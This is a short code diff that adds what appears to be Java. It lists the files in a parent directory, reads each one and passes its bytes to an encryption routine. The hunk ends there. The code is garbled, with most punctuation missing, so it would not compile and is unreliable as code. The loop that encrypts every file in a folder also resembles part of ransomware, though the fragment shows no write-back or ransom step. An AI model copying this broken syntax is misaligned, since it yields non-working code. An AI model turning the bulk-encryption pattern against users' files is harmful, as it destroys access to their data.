@@ -1,0 +1,10 @@
+import javax crypto KeyGenerator
+import java util BitSet
+import java util Random
+
+if parentDir exists
+File  files  parentDir listFiles
+for  int i  0 i  files length i++
+Path path = files i toPath
+byte bytes = Files readAllBytes path
+byte encrypt = EncryptionUtils encrypt bytes
